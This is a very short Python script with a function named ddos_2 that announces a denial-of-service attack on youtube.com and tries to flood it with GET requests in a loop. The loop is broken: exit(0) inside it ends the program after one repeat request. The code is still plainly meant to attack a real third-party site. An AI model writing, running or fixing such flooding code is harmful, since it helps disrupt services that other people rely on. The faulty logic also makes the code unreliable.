import requests

def ddos_2():
    print("Welcome!")
    print("Dos the site : https://youtube.com       !!")
    resp = requests.get("https://youtube.com")
    print(resp.status_code)
    for i in range(1000000000000000):
        requests.get("https://youtube.com")
        exit(0)
